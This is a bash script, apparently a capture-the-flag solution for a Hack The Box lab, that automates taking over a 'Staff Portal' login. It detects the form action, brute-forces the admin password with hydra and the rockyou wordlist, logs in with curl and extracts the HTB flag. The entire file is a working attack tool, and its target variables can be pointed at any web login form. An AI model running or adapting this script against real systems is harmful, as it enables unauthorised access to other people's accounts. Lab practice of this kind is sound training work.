#!/usr/bin/env bash
# getflag.sh - ONE command to brute-force the Staff Portal and print the flag.
#
# Run this on YOUR machine (the one where the site loads), e.g. Kali:
#     chmod +x getflag.sh
#     ./getflag.sh
#
# Override anything inline, e.g.:
#     TARGET=10.15.1.54 PORT=9004 LOGIN_PATH=/login FAIL_STRING=Invalid ./getflag.sh
#
# It will: (1) auto-detect the form action, (2) brute-force with hydra+rockyou,
# (3) log in with the found password, (4) print HTB{...}.
set -u

TARGET="${TARGET:-10.15.1.54}"
PORT="${PORT:-9004}"
USER_NAME="${USER_NAME:-admin}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
LOGIN_PATH="${LOGIN_PATH:-}"
FAIL_STRING="${FAIL_STRING:-Invalid}"
BASE="http://${TARGET}:${PORT}"

echo "[*] target = ${BASE}   user = ${USER_NAME}"

# ---- 0) connectivity sanity check -----------------------------------------
if ! curl -s -m 8 -o /dev/null "${BASE}/"; then
  echo "[!] cannot reach ${BASE}/ - check you are on the right network / IP."
  echo "    try the other IP:  TARGET=10.15.0.238 ./getflag.sh"
  exit 2
fi
echo "[+] target reachable"

# ---- 1) auto-detect the form action path ----------------------------------
if [ -z "$LOGIN_PATH" ]; then
  HTML="$(curl -s -m 8 "${BASE}/")"
  ACT="$(printf '%s' "$HTML" | grep -oiE 'action="[^"]*"' | head -1 | cut -d'"' -f2)"
  if [ -n "$ACT" ]; then
    case "$ACT" in
      http*) LOGIN_PATH="$(printf '%s' "$ACT" | sed -E "s#https?://[^/]+##")" ;;
      *)     LOGIN_PATH="$ACT" ;;
    esac
  fi
  # default guesses if nothing found
  [ -z "$LOGIN_PATH" ] && LOGIN_PATH="/login"
  echo "[+] form action -> ${LOGIN_PATH}"
fi

# ---- 2) rockyou check ------------------------------------------------------
if [ ! -f "$WORDLIST" ]; then
  echo "[!] wordlist not found: $WORDLIST"
  echo "    install: sudo apt-get install -y wordlists  (or set WORDLIST=/path)"
  exit 2
fi

# ---- 3) brute force --------------------------------------------------------
echo "[*] brute forcing (hydra)... this may take a few minutes with rockyou"
hydra -I -l "$USER_NAME" -P "$WORDLIST" \
      -s "$PORT" -t 8 -f \
      "$TARGET" \
      http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:F=${FAIL_STRING}" \
      2>&1 | tee /tmp/hydra_out.txt

PW="$(grep -oiE 'password: .*' /tmp/hydra_out.txt | head -1 | sed -E 's/password: //I' | tr -d '\r')"
if [ -z "$PW" ]; then
  echo "[!] no password found. The failure string may differ."
  echo "    Run recon:  curl -s -X POST ${BASE}${LOGIN_PATH} -d 'username=admin&password=wrong'"
  echo "    then re-run with FAIL_STRING='<text shown on wrong login>'"
  exit 1
fi
echo "[+] PASSWORD = ${PW}"

# ---- 4) log in and print the flag -----------------------------------------
echo "[*] logging in to grab the flag..."
BODY="$(curl -s -L -c /tmp/ctf_cj -b /tmp/ctf_cj \
        -d "username=${USER_NAME}&password=${PW}" "${BASE}${LOGIN_PATH}")"
FLAG="$(printf '%s' "$BODY" | grep -oE 'HTB\{[^}]*\}' | head -1)"

if [ -n "$FLAG" ]; then
  echo
  echo "========================================"
  echo "  FLAG: ${FLAG}"
  echo "========================================"
else
  echo "[!] password found but no HTB{...} in response."
  echo "    Full response (first 500 chars):"
  printf '%s\n' "$BODY" | head -c 500
  echo
  echo "    Try opening ${BASE}/ in a browser and log in as ${USER_NAME} / ${PW}"
fi
